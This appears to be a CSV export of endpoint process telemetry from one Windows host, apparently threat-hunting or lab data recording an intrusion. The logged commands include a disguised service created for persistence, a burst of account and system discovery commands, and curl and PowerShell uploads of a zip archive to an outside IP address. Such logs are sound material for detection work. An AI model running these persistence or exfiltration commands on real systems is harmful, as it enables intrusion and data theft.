Timestamp,DeviceName,AccountName,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,RemoteIP
"Sep 16, 2025 3:20:37 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:22:30 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:22:32 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:23:17 PM",slflarewinsysmo,slflare,rundll32.exe,"rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:23:56 PM",slflarewinsysmo,slflare,notepad.exe,"""NOTEPAD.EXE"" C:\Windows\System32\LogFiles\WMI\wmi_maintenance.txt",explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:26:22 PM",slflarewinsysmo,slflare,powershell_ise.exe,"""powershell_ise.exe"" ""C:\Windows\System32\LogFiles\WMI\wmi_maintenance.ps1""",explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:32:31 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:38:40 PM",slflarewinsysmo,slflare,msupdate.exe,"""msupdate.exe"" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 ",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:38:40 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,msupdate.exe,"""msupdate.exe"" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 ",159.26.106.84
"Sep 16, 2025 3:38:42 PM",slflarewinsysmo,slflare,whoami.exe,whoami.exe,msupdate.exe,"""msupdate.exe"" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 ",159.26.106.84
"Sep 16, 2025 3:39:45 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""sc.exe create ""MSUpdateService"" binPath= ""powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1"" DisplayName= ""Microsoft Update Service"" start= auto""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:39:45 PM",slflarewinsysmo,slflare,sc.exe,"sc.exe  create ""MSUpdateService"" binPath= ""powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1"" DisplayName= ""Microsoft Update Service"" start= auto",cmd.exe,"""cmd.exe"" /c ""sc.exe create ""MSUpdateService"" binPath= ""powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1"" DisplayName= ""Microsoft Update Service"" start= auto""",159.26.106.84
"Sep 16, 2025 3:39:45 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""sc.exe description ""MSUpdateService"" ""Provides automated Microsoft product updates and synchronization""""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:39:45 PM",slflarewinsysmo,slflare,sc.exe,"sc.exe  description ""MSUpdateService"" ""Provides automated Microsoft product updates and synchronization""",cmd.exe,"""cmd.exe"" /c ""sc.exe description ""MSUpdateService"" ""Provides automated Microsoft product updates and synchronization""""",159.26.106.84
"Sep 16, 2025 3:40:28 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c systeminfo",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:28 PM",slflarewinsysmo,slflare,systeminfo.exe,systeminfo,cmd.exe,"""cmd.exe"" /c systeminfo",159.26.106.84
"Sep 16, 2025 3:40:34 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""whoami /all""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:34 PM",slflarewinsysmo,slflare,whoami.exe,whoami  /all,cmd.exe,"""cmd.exe"" /c ""whoami /all""",159.26.106.84
"Sep 16, 2025 3:40:35 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""net user""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:35 PM",slflarewinsysmo,slflare,net.exe,net  user,cmd.exe,"""cmd.exe"" /c ""net user""",159.26.106.84
"Sep 16, 2025 3:40:36 PM",slflarewinsysmo,slflare,net1.exe,net1  user,net.exe,net  user,159.26.106.84
"Sep 16, 2025 3:40:37 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""net localgroup administrators""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:37 PM",slflarewinsysmo,slflare,net.exe,net  localgroup administrators,cmd.exe,"""cmd.exe"" /c ""net localgroup administrators""",159.26.106.84
"Sep 16, 2025 3:40:37 PM",slflarewinsysmo,slflare,net1.exe,net1  localgroup administrators,net.exe,net  localgroup administrators,159.26.106.84
"Sep 16, 2025 3:40:38 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""ipconfig /all""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:38 PM",slflarewinsysmo,slflare,ipconfig.exe,ipconfig  /all,cmd.exe,"""cmd.exe"" /c ""ipconfig /all""",159.26.106.84
"Sep 16, 2025 3:40:39 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""netstat -ano""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:39 PM",slflarewinsysmo,slflare,NETSTAT.EXE,netstat  -ano,cmd.exe,"""cmd.exe"" /c ""netstat -ano""",159.26.106.84
"Sep 16, 2025 3:40:41 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""tasklist /svc""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:41 PM",slflarewinsysmo,slflare,tasklist.exe,tasklist  /svc,cmd.exe,"""cmd.exe"" /c ""tasklist /svc""",159.26.106.84
"Sep 16, 2025 3:40:42 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""wmic computersystem get domain""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:42 PM",slflarewinsysmo,slflare,WMIC.exe,wmic  computersystem get domain,cmd.exe,"""cmd.exe"" /c ""wmic computersystem get domain""",159.26.106.84
"Sep 16, 2025 3:40:44 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""query user""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:40:44 PM",slflarewinsysmo,slflare,query.exe,query  user,cmd.exe,"""cmd.exe"" /c ""query user""",159.26.106.84
"Sep 16, 2025 3:40:44 PM",slflarewinsysmo,slflare,quser.exe,quser.exe,query.exe,query  user,159.26.106.84
"Sep 16, 2025 3:42:04 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:42:04 PM",slflarewinsysmo,slflare,cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:42:45 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:43:11 PM",slflarewinsysmo,slflare,ngentask.exe,"""NGenTask.exe"" /StopEvent:1408",ngentask.exe,"""NGenTask.exe"" /RuntimeWide /StopEvent:2052",159.26.106.84
"Sep 16, 2025 3:43:11 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,ngentask.exe,"""NGenTask.exe"" /StopEvent:1408",159.26.106.84
"Sep 16, 2025 3:43:12 PM",slflarewinsysmo,slflare,ngentask.exe,"""NGenTask.exe"" /StopEvent:1320",ngentask.exe,"""NGenTask.exe"" /RuntimeWide /StopEvent:2004",159.26.106.84
"Sep 16, 2025 3:43:12 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,ngentask.exe,"""NGenTask.exe"" /StopEvent:1320",159.26.106.84
"Sep 16, 2025 3:43:20 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:43:20 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /c curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",159.26.106.84
"Sep 16, 2025 3:43:21 PM",slflarewinsysmo,slflare,curl.exe,"curl  -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",cmd.exe,"""cmd.exe"" /c curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload ",159.26.106.84
"Sep 16, 2025 3:43:28 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c powershell -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:43:28 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /c powershell -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",159.26.106.84
"Sep 16, 2025 3:43:28 PM",slflarewinsysmo,slflare,powershell.exe,"powershell  -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",cmd.exe,"""cmd.exe"" /c powershell -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'"" ",159.26.106.84
"Sep 16, 2025 3:43:35 PM",slflarewinsysmo,slflare,SecurityHealthHost.exe,SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:43:43 PM",slflarewinsysmo,slflare,taskhostw.exe,"taskhostw.exe ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:44:38 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:46:13 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe Install $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:46:13 PM",slflarewinsysmo,slflare,cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:46:13 PM",slflarewinsysmo,slflare,TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:46:15 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:46:30 PM",slflarewinsysmo,slflare,DismHost.exe,dismhost.exe {A456061A-6E36-43C1-BBF6-9B3F96B96271},cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",159.26.106.84
"Sep 16, 2025 3:46:45 PM",slflarewinsysmo,slflare,OneDriveStandaloneUpdater.exe,"""OneDriveStandaloneUpdater.exe"" /reporting",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:46:54 PM",slflarewinsysmo,slflare,TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:46:55 PM",slflarewinsysmo,slflare,rdpclip.exe,rdpclip,svchost.exe,svchost.exe -k NetworkService,159.26.106.84
"Sep 16, 2025 3:46:56 PM",slflarewinsysmo,slflare,taskhostw.exe,"taskhostw.exe ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:46:59 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:47:01 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe KEYROAMING,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:47:26 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:47:48 PM",slflarewinsysmo,slflare,TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:47:50 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:47:52 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe KEYROAMING,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:57:47 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 4:13:28 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
